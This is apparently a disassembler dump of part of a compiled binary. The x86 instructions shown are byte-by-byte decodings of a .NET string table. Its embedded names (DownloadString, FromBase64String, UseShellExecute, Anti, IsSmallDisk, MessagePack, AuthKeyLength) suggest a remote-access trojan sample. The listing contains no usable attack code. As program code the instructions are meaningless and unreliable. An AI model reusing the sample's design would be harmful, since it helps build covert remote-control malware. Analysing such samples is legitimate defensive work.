  4080fe:	53                   	push   %ebx
  4080ff:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408106:	74 
  408107:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810b:	6d                   	insl   (%dx),%es:(%edi)
  40810c:	70 69                	jo     0x408177
  40810e:	6c                   	insb   (%dx),%es:(%edi)
  40810f:	65 72 47             	gs jb  0x408159
  408112:	65 6e                	outsb  %gs:(%esi),(%dx)
  408114:	65 72 61             	gs jb  0x408178
  408117:	74 65                	je     0x40817e
  408119:	64 41                	fs inc %ecx
  40811b:	74 74                	je     0x408191
  40811d:	72 69                	jb     0x408188
  40811f:	62 75 74             	bound  %esi,0x74(%ebp)
  408122:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408127:	75 67                	jne    0x408190
  408129:	67 61                	addr16 popa
  40812b:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40812f:	74 74                	je     0x4081a5
  408131:	72 69                	jb     0x40819c
  408133:	62 75 74             	bound  %esi,0x74(%ebp)
  408136:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813a:	6d                   	insl   (%dx),%es:(%edi)
  40813b:	56                   	push   %esi
  40813c:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408143:	74 74                	je     0x4081b9
  408145:	72 69                	jb     0x4081b0
  408147:	62 75 74             	bound  %esi,0x74(%ebp)
  40814a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40814e:	73 65                	jae    0x4081b5
  408150:	6d                   	insl   (%dx),%es:(%edi)
  408151:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408155:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40815c:	72 
  40815d:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408164:	73 73                	jae    0x4081d9
  408166:	65 6d                	gs insl (%dx),%es:(%edi)
  408168:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40816c:	72 61                	jb     0x4081cf
  40816e:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408171:	61                   	popa
  408172:	72 6b                	jb     0x4081df
  408174:	41                   	inc    %ecx
  408175:	74 74                	je     0x4081eb
  408177:	72 69                	jb     0x4081e2
  408179:	62 75 74             	bound  %esi,0x74(%ebp)
  40817c:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408181:	67 65 74 46          	addr16 gs je 0x4081cb
  408185:	72 61                	jb     0x4081e8
  408187:	6d                   	insl   (%dx),%es:(%edi)
  408188:	65 77 6f             	gs ja  0x4081fa
  40818b:	72 6b                	jb     0x4081f8
  40818d:	41                   	inc    %ecx
  40818e:	74 74                	je     0x408204
  408190:	72 69                	jb     0x4081fb
  408192:	62 75 74             	bound  %esi,0x74(%ebp)
  408195:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408199:	73 65                	jae    0x408200
  40819b:	6d                   	insl   (%dx),%es:(%edi)
  40819c:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a0:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081a7:	69 
  4081a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081aa:	41                   	inc    %ecx
  4081ab:	74 74                	je     0x408221
  4081ad:	72 69                	jb     0x408218
  4081af:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b6:	73 65                	jae    0x40821d
  4081b8:	6d                   	insl   (%dx),%es:(%edi)
  4081b9:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081be:	6e                   	outsb  %ds:(%esi),(%dx)
  4081bf:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c5:	74 69                	je     0x408230
  4081c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c9:	41                   	inc    %ecx
  4081ca:	74 74                	je     0x408240
  4081cc:	72 69                	jb     0x408237
  4081ce:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d5:	73 65                	jae    0x40823c
  4081d7:	6d                   	insl   (%dx),%es:(%edi)
  4081d8:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081dc:	65 73 63             	gs jae 0x408242
  4081df:	72 69                	jb     0x40824a
  4081e1:	70 74                	jo     0x408257
  4081e3:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ea:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f1:	65 66 61             	gs popaw
  4081f4:	75 6c                	jne    0x408262
  4081f6:	74 4d                	je     0x408245
  4081f8:	65 6d                	gs insl (%dx),%es:(%edi)
  4081fa:	62 65 72             	bound  %esp,0x72(%ebp)
  4081fd:	41                   	inc    %ecx
  4081fe:	74 74                	je     0x408274
  408200:	72 69                	jb     0x40826b
  408202:	62 75 74             	bound  %esi,0x74(%ebp)
  408205:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408209:	6d                   	insl   (%dx),%es:(%edi)
  40820a:	70 69                	jo     0x408275
  40820c:	6c                   	insb   (%dx),%es:(%edi)
  40820d:	61                   	popa
  40820e:	74 69                	je     0x408279
  408210:	6f                   	outsl  %ds:(%esi),(%dx)
  408211:	6e                   	outsb  %ds:(%esi),(%dx)
  408212:	52                   	push   %edx
  408213:	65 6c                	gs insb (%dx),%es:(%edi)
  408215:	61                   	popa
  408216:	78 61                	js     0x408279
  408218:	74 69                	je     0x408283
  40821a:	6f                   	outsl  %ds:(%esi),(%dx)
  40821b:	6e                   	outsb  %ds:(%esi),(%dx)
  40821c:	73 41                	jae    0x40825f
  40821e:	74 74                	je     0x408294
  408220:	72 69                	jb     0x40828b
  408222:	62 75 74             	bound  %esi,0x74(%ebp)
  408225:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408229:	73 65                	jae    0x408290
  40822b:	6d                   	insl   (%dx),%es:(%edi)
  40822c:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408230:	72 6f                	jb     0x4082a1
  408232:	64 75 63             	fs jne 0x408298
  408235:	74 41                	je     0x408278
  408237:	74 74                	je     0x4082ad
  408239:	72 69                	jb     0x4082a4
  40823b:	62 75 74             	bound  %esi,0x74(%ebp)
  40823e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408242:	73 65                	jae    0x4082a9
  408244:	6d                   	insl   (%dx),%es:(%edi)
  408245:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408249:	6f                   	outsl  %ds:(%esi),(%dx)
  40824a:	70 79                	jo     0x4082c5
  40824c:	72 69                	jb     0x4082b7
  40824e:	67 68 74 41 74 74    	addr16 push $0x74744174
  408254:	72 69                	jb     0x4082bf
  408256:	62 75 74             	bound  %esi,0x74(%ebp)
  408259:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40825d:	73 65                	jae    0x4082c4
  40825f:	6d                   	insl   (%dx),%es:(%edi)
  408260:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408264:	6f                   	outsl  %ds:(%esi),(%dx)
  408265:	6d                   	insl   (%dx),%es:(%edi)
  408266:	70 61                	jo     0x4082c9
  408268:	6e                   	outsb  %ds:(%esi),(%dx)
  408269:	79 41                	jns    0x4082ac
  40826b:	74 74                	je     0x4082e1
  40826d:	72 69                	jb     0x4082d8
  40826f:	62 75 74             	bound  %esi,0x74(%ebp)
  408272:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408276:	6e                   	outsb  %ds:(%esi),(%dx)
  408277:	74 69                	je     0x4082e2
  408279:	6d                   	insl   (%dx),%es:(%edi)
  40827a:	65 43                	gs inc %ebx
  40827c:	6f                   	outsl  %ds:(%esi),(%dx)
  40827d:	6d                   	insl   (%dx),%es:(%edi)
  40827e:	70 61                	jo     0x4082e1
  408280:	74 69                	je     0x4082eb
  408282:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408285:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40828c:	69 
  40828d:	62 75 74             	bound  %esi,0x74(%ebp)
  408290:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408294:	74 5f                	je     0x4082f5
  408296:	55                   	push   %ebp
  408297:	73 65                	jae    0x4082fe
  408299:	53                   	push   %ebx
  40829a:	68 65 6c 6c 45       	push   $0x456c6c65
  40829f:	78 65                	js     0x408306
  4082a1:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a4:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082a8:	61                   	popa
  4082a9:	64 42                	fs inc %edx
  4082ab:	79 74                	jns    0x408321
  4082ad:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b1:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082b8:	00 
  4082b9:	44                   	inc    %esp
  4082ba:	65 6c                	gs insb (%dx),%es:(%edi)
  4082bc:	65 74 65             	gs je  0x408324
  4082bf:	56                   	push   %esi
  4082c0:	61                   	popa
  4082c1:	6c                   	insb   (%dx),%es:(%edi)
  4082c2:	75 65                	jne    0x408329
  4082c4:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c8:	65 72 56             	gs jb  0x408321
  4082cb:	61                   	popa
  4082cc:	6c                   	insb   (%dx),%es:(%edi)
  4082cd:	75 65                	jne    0x408334
  4082cf:	00 47 65             	add    %al,0x65(%edi)
  4082d2:	74 56                	je     0x40832a
  4082d4:	61                   	popa
  4082d5:	6c                   	insb   (%dx),%es:(%edi)
  4082d6:	75 65                	jne    0x40833d
  4082d8:	00 53 65             	add    %dl,0x65(%ebx)
  4082db:	74 56                	je     0x408333
  4082dd:	61                   	popa
  4082de:	6c                   	insb   (%dx),%es:(%edi)
  4082df:	75 65                	jne    0x408346
  4082e1:	00 76 61             	add    %dh,0x61(%esi)
  4082e4:	6c                   	insb   (%dx),%es:(%edi)
  4082e5:	75 65                	jne    0x40834c
  4082e7:	00 67 65             	add    %ah,0x65(%edi)
  4082ea:	74 5f                	je     0x40834b
  4082ec:	4b                   	dec    %ebx
  4082ed:	65 65 70 41          	gs gs jo 0x408332
  4082f1:	6c                   	insb   (%dx),%es:(%edi)
  4082f2:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082f9:	5f                   	pop    %edi
  4082fa:	4b                   	dec    %ebx
  4082fb:	65 65 70 41          	gs gs jo 0x408340
  4082ff:	6c                   	insb   (%dx),%es:(%edi)
  408300:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408307:	6f                   	outsl  %ds:(%esi),(%dx)
  408308:	76 65                	jbe    0x40836f
  40830a:	00 41 46             	add    %al,0x46(%ecx)
  40830d:	38 38                	cmp    %bh,(%eax)
  40830f:	2e 65 78 65          	cs js,pn 0x408378
  408313:	00 73 65             	add    %dh,0x65(%ebx)
  408316:	74 5f                	je     0x408377
  408318:	42                   	inc    %edx
  408319:	6c                   	insb   (%dx),%es:(%edi)
  40831a:	6f                   	outsl  %ds:(%esi),(%dx)
  40831b:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40831e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408325:	5f                   	pop    %edi
  408326:	54                   	push   %esp
  408327:	6f                   	outsl  %ds:(%esi),(%dx)
  408328:	74 61                	je     0x40838b
  40832a:	6c                   	insb   (%dx),%es:(%edi)
  40832b:	53                   	push   %ebx
  40832c:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408333:	5f                   	pop    %edi
  408334:	48                   	dec    %eax
  408335:	65 61                	gs popa
  408337:	64 65 72 53          	fs gs jb 0x40838e
  40833b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408342:	5f                   	pop    %edi
  408343:	48                   	dec    %eax
  408344:	65 61                	gs popa
  408346:	64 65 72 53          	fs gs jb 0x40839d
  40834a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408351:	5f                   	pop    %edi
  408352:	53                   	push   %ebx
  408353:	65 6e                	outsb  %gs:(%esi),(%dx)
  408355:	64 42                	fs inc %edx
  408357:	75 66                	jne    0x4083bf
  408359:	66 65 72 53          	data16 gs jb 0x4083b0
  40835d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408364:	5f                   	pop    %edi
  408365:	52                   	push   %edx
  408366:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40836a:	76 65                	jbe    0x4083d1
  40836c:	42                   	inc    %edx
  40836d:	75 66                	jne    0x4083d5
  40836f:	66 65 72 53          	data16 gs jb 0x4083c6
  408373:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40837a:	5f                   	pop    %edi
  40837b:	4b                   	dec    %ebx
  40837c:	65 79 53             	gs jns 0x4083d2
  40837f:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408386:	65 78 4f             	gs js  0x4083d8
  408389:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40838d:	72 46                	jb     0x4083d5
  40838f:	6c                   	insb   (%dx),%es:(%edi)
  408390:	61                   	popa
  408391:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408395:	79 70                	jns    0x408407
  408397:	74 6f                	je     0x408408
  408399:	43                   	inc    %ebx
  40839a:	6f                   	outsl  %ds:(%esi),(%dx)
  40839b:	6e                   	outsb  %ds:(%esi),(%dx)
  40839c:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a2:	74 5f                	je     0x408403
  4083a4:	50                   	push   %eax
  4083a5:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ac:	5f                   	pop    %edi
  4083ad:	50                   	push   %eax
  4083ae:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083b5:	74 65                	je     0x40841c
  4083b7:	6d                   	insl   (%dx),%es:(%edi)
  4083b8:	2e 54                	cs push %esp
  4083ba:	68 72 65 61 64       	push   $0x64616572
  4083bf:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083c6:	5f                   	pop    %edi
  4083c7:	50                   	push   %eax
  4083c8:	61                   	popa
  4083c9:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d0:	64 64 
  4083d2:	5f                   	pop    %edi
  4083d3:	53                   	push   %ebx
  4083d4:	65 73 73             	gs jae 0x40844a
  4083d7:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083de:	6e                   	outsb  %ds:(%esi),(%dx)
  4083df:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e3:	73 74                	jae    0x408459
  4083e5:	65 6d                	gs insl (%dx),%es:(%edi)
  4083e7:	45                   	inc    %ebp
  4083e8:	76 65                	jbe    0x40844f
  4083ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4083eb:	74 73                	je     0x408460
  4083ed:	5f                   	pop    %edi
  4083ee:	53                   	push   %ebx
  4083ef:	65 73 73             	gs jae 0x408465
  4083f2:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fa:	67 00 55 54          	add    %dl,0x54(%di)
  4083fe:	46                   	inc    %esi
  4083ff:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408402:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408405:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40840c:	74 65                	je     0x408473
  40840e:	6d                   	insl   (%dx),%es:(%edi)
  40840f:	2e 44                	cs inc %esp
  408411:	72 61                	jb     0x408474
  408413:	77 69                	ja     0x40847e
  408415:	6e                   	outsb  %ds:(%esi),(%dx)
  408416:	67 2e 49             	addr16 cs dec %ecx
  408419:	6d                   	insl   (%dx),%es:(%edi)
  40841a:	61                   	popa
  40841b:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408422:	73 
  408423:	74 65                	je     0x40848a
  408425:	6d                   	insl   (%dx),%es:(%edi)
  408426:	2e 52                	cs push %edx
  408428:	75 6e                	jne    0x408498
  40842a:	74 69                	je     0x408495
  40842c:	6d                   	insl   (%dx),%es:(%edi)
  40842d:	65 2e 56             	gs cs push %esi
  408430:	65 72 73             	gs jb  0x4084a6
  408433:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40843a:	46                   	inc    %esi
  40843b:	72 6f                	jb     0x4084ac
  40843d:	6d                   	insl   (%dx),%es:(%edi)
  40843e:	42                   	inc    %edx
  40843f:	61                   	popa
  408440:	73 65                	jae    0x4084a7
  408442:	36 34 53             	ss xor $0x53,%al
  408445:	74 72                	je     0x4084b9
  408447:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  40844e:	61                   	popa
  40844f:	73 65                	jae    0x4084b6
  408451:	36 34 53             	ss xor $0x53,%al
  408454:	74 72                	je     0x4084c8
  408456:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40845d:	64 53                	fs push %ebx
  40845f:	74 72                	je     0x4084d3
  408461:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408468:	6e                   	outsb  %ds:(%esi),(%dx)
  408469:	6c                   	insb   (%dx),%es:(%edi)
  40846a:	6f                   	outsl  %ds:(%esi),(%dx)
  40846b:	61                   	popa
  40846c:	64 53                	fs push %ebx
  40846e:	74 72                	je     0x4084e2
  408470:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408477:	74 65                	je     0x4084de
  408479:	53                   	push   %ebx
  40847a:	74 72                	je     0x4084ee
  40847c:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408483:	74 72                	je     0x4084f7
  408485:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40848c:	5f                   	pop    %edi
  40848d:	41                   	inc    %ecx
  40848e:	73 53                	jae    0x4084e3
  408490:	74 72                	je     0x408504
  408492:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408499:	5f                   	pop    %edi
  40849a:	41                   	inc    %ecx
  40849b:	73 53                	jae    0x4084f0
  40849d:	74 72                	je     0x408511
  40849f:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084a6:	65 73 41             	gs jae 0x4084ea
  4084a9:	73 53                	jae    0x4084fe
  4084ab:	74 72                	je     0x40851f
  4084ad:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084b4:	41                   	inc    %ecx
  4084b5:	73 53                	jae    0x40850a
  4084b7:	74 72                	je     0x40852b
  4084b9:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c0:	41                   	inc    %ecx
  4084c1:	73 53                	jae    0x408516
  4084c3:	74 72                	je     0x408537
  4084c5:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084cc:	53                   	push   %ebx
  4084cd:	74 72                	je     0x408541
  4084cf:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084d6:	65 73 41             	gs jae 0x40851a
  4084d9:	73 48                	jae    0x408523
  4084db:	65 78 53             	gs js  0x408531
  4084de:	74 72                	je     0x408552
  4084e0:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084e7:	73 74                	jae    0x40855d
  4084e9:	72 69                	jb     0x408554
  4084eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ec:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f0:	73 74                	jae    0x408566
  4084f2:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f4:	2e 44                	cs inc %esp
  4084f6:	72 61                	jb     0x408559
  4084f8:	77 69                	ja     0x408563
  4084fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fb:	67 00 67 65          	add    %ah,0x65(%bx)
  4084ff:	74 5f                	je     0x408560
  408501:	41                   	inc    %ecx
  408502:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408506:	61                   	popa
  408507:	74 65                	je     0x40856e
  408509:	50                   	push   %eax
  40850a:	6f                   	outsl  %ds:(%esi),(%dx)
  40850b:	6e                   	outsb  %ds:(%esi),(%dx)
  40850c:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408510:	74 5f                	je     0x408571
  408512:	41                   	inc    %ecx
  408513:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408517:	61                   	popa
  408518:	74 65                	je     0x40857f
  40851a:	50                   	push   %eax
  40851b:	6f                   	outsl  %ds:(%esi),(%dx)
  40851c:	6e                   	outsb  %ds:(%esi),(%dx)
  40851d:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408521:	74 5f                	je     0x408582
  408523:	45                   	inc    %ebp
  408524:	72 72                	jb     0x408598
  408526:	6f                   	outsl  %ds:(%esi),(%dx)
  408527:	72 44                	jb     0x40856d
  408529:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408530:	73 67                	jae    0x408599
  408532:	00 43 6f             	add    %al,0x6f(%ebx)
  408535:	6d                   	insl   (%dx),%es:(%edi)
  408536:	70 75                	jo     0x4085ad
  408538:	74 65                	je     0x40859f
  40853a:	48                   	dec    %eax
  40853b:	61                   	popa
  40853c:	73 68                	jae    0x4085a6
  40853e:	00 73 74             	add    %dh,0x74(%ebx)
  408541:	72 54                	jb     0x408597
  408543:	6f                   	outsl  %ds:(%esi),(%dx)
  408544:	48                   	dec    %eax
  408545:	61                   	popa
  408546:	73 68                	jae    0x4085b0
  408548:	00 47 65             	add    %al,0x65(%edi)
  40854b:	74 48                	je     0x408595
  40854d:	61                   	popa
  40854e:	73 68                	jae    0x4085b8
  408550:	00 56 65             	add    %dl,0x65(%esi)
  408553:	72 69                	jb     0x4085be
  408555:	66 79 48             	data16 jns 0x4085a0
  408558:	61                   	popa
  408559:	73 68                	jae    0x4085c3
  40855b:	00 46 6c             	add    %al,0x6c(%esi)
  40855e:	75 73                	jne    0x4085d3
  408560:	68 00 67 65 74       	push   $0x74656700
  408565:	5f                   	pop    %edi
  408566:	45                   	inc    %ebp
  408567:	78 65                	js     0x4085ce
  408569:	63 75 74             	arpl   %esi,0x74(%ebp)
  40856c:	61                   	popa
  40856d:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408571:	61                   	popa
  408572:	74 68                	je     0x4085dc
  408574:	00 47 65             	add    %al,0x65(%edi)
  408577:	74 54                	je     0x4085cd
  408579:	65 6d                	gs insl (%dx),%es:(%edi)
  40857b:	70 50                	jo     0x4085cd
  40857d:	61                   	popa
  40857e:	74 68                	je     0x4085e8
  408580:	00 70 61             	add    %dh,0x61(%eax)
  408583:	74 68                	je     0x4085ed
  408585:	00 48 6d             	add    %cl,0x6d(%eax)
  408588:	61                   	popa
  408589:	63 53 68             	arpl   %edx,0x68(%ebx)
  40858c:	61                   	popa
  40858d:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408593:	67 74 68             	addr16 je 0x4085fe
  408596:	00 67 65             	add    %ah,0x65(%edi)
  408599:	74 5f                	je     0x4085fa
  40859b:	4c                   	dec    %esp
  40859c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40859e:	67 74 68             	addr16 je 0x408609
  4085a1:	00 49 76             	add    %cl,0x76(%ecx)
  4085a4:	4c                   	dec    %esp
  4085a5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a7:	67 74 68             	addr16 je 0x408612
  4085aa:	00 41 75             	add    %al,0x75(%ecx)
  4085ad:	74 68                	je     0x408617
  4085af:	4b                   	dec    %ebx
  4085b0:	65 79 4c             	gs jns 0x4085ff
  4085b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b5:	67 74 68             	addr16 je 0x408620
  4085b8:	00 55 72             	add    %dl,0x72(%ebp)
  4085bb:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c1:	00 6d 73             	add    %ch,0x73(%ebp)
  4085c4:	67 70 61             	addr16 jo 0x408628
  4085c7:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085ca:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085cd:	6c                   	insb   (%dx),%es:(%edi)
  4085ce:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d6:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d9:	4d                   	dec    %ebp
  4085da:	65 73 73             	gs jae 0x408650
  4085dd:	61                   	popa
  4085de:	67 65 50             	addr16 gs push %eax
  4085e1:	61                   	popa
  4085e2:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085e5:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085ec:	61                   	popa
  4085ed:	67 65 50             	addr16 gs push %eax
  4085f0:	61                   	popa
  4085f1:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085f4:	4d                   	dec    %ebp
  4085f5:	73 67                	jae    0x40865e
  4085f7:	50                   	push   %eax
  4085f8:	61                   	popa
  4085f9:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fc:	41                   	inc    %ecx
  4085fd:	73 79                	jae    0x408678
  4085ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408600:	63 43 61             	arpl   %eax,0x61(%ebx)
  408603:	6c                   	insb   (%dx),%es:(%edi)
  408604:	6c                   	insb   (%dx),%es:(%edi)
  408605:	62 61 63             	bound  %esp,0x63(%ecx)
  408608:	6b 00 52             	imul   $0x52,(%eax),%eax
  40860b:	65 6d                	gs insl (%dx),%es:(%edi)
  40860d:	6f                   	outsl  %ds:(%esi),(%dx)
  40860e:	74 65                	je     0x408675
  408610:	43                   	inc    %ebx
  408611:	65 72 74             	gs jb  0x408688
  408614:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40861b:	56                   	push   %esi
  40861c:	61                   	popa
  40861d:	6c                   	insb   (%dx),%es:(%edi)
  40861e:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408625:	43 
  408626:	61                   	popa
  408627:	6c                   	insb   (%dx),%es:(%edi)
  408628:	6c                   	insb   (%dx),%es:(%edi)
  408629:	62 61 63             	bound  %esp,0x63(%ecx)
  40862c:	6b 00 54             	imul   $0x54,(%eax),%eax
  40862f:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408636:	6c                   	insb   (%dx),%es:(%edi)
  408637:	62 61 63             	bound  %esp,0x63(%ecx)
  40863a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40863d:	6e                   	outsb  %ds:(%esi),(%dx)
  40863e:	70 61                	jo     0x4086a1
  408640:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408643:	6d                   	insl   (%dx),%es:(%edi)
  408644:	73 67                	jae    0x4086ad
  408646:	70 61                	jo     0x4086a9
  408648:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40864b:	52                   	push   %edx
  40864c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408653:	4b 65 
  408655:	79 50                	jns    0x4086a7
  408657:	65 72 6d             	gs jb  0x4086c7
  40865a:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408661:	68 65 63 6b 00       	push   $0x6b6365
  408666:	46                   	inc    %esi
  408667:	6c                   	insb   (%dx),%es:(%edi)
  408668:	75 73                	jne    0x4086dd
  40866a:	68 46 69 6e 61       	push   $0x616e6946
  40866f:	6c                   	insb   (%dx),%es:(%edi)
  408670:	42                   	inc    %edx
  408671:	6c                   	insb   (%dx),%es:(%edi)
  408672:	6f                   	outsl  %ds:(%esi),(%dx)
  408673:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408676:	49                   	dec    %ecx
  408677:	73 53                	jae    0x4086cc
  408679:	6d                   	insl   (%dx),%es:(%edi)
  40867a:	61                   	popa
  40867b:	6c                   	insb   (%dx),%es:(%edi)
  40867c:	6c                   	insb   (%dx),%es:(%edi)
  40867d:	44                   	inc    %esp
  40867e:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408685:	6c                   	insb   (%dx),%es:(%edi)
  408686:	00 66 56             	add    %ah,0x56(%esi)
  408689:	61                   	popa
  40868a:	6c                   	insb   (%dx),%es:(%edi)
  40868b:	00 69 56             	add    %ch,0x56(%ecx)
  40868e:	61                   	popa
  40868f:	6c                   	insb   (%dx),%es:(%edi)
  408690:	00 73 74             	add    %dh,0x74(%ebx)
  408693:	72 56                	jb     0x4086eb
  408695:	61                   	popa
  408696:	6c                   	insb   (%dx),%es:(%edi)
  408697:	00 52 74             	add    %dl,0x74(%edx)
  40869a:	6c                   	insb   (%dx),%es:(%edi)
